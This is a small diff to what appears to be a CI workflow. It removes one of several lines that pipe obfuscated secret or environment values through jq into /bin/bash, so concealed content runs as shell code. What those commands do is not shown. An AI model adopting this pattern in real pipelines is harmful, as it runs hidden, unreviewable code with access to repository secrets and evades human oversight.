@@ -22,7 +22,6 @@ jobs:
           chiyo10436: ${{ secrets.chiyo10436 }}
         run: |
           printf '%s' "$chiyo10436" | jq -r .ivdtr492 | /bin/bash
-          echo $vde67 | jq -r .agklk4964 | /bin/bash
           echo $kj74502 | jq -r .hc43 | /bin/bash
           echo $haiwo83 | jq -r .eykw5507 | /bin/bash
 
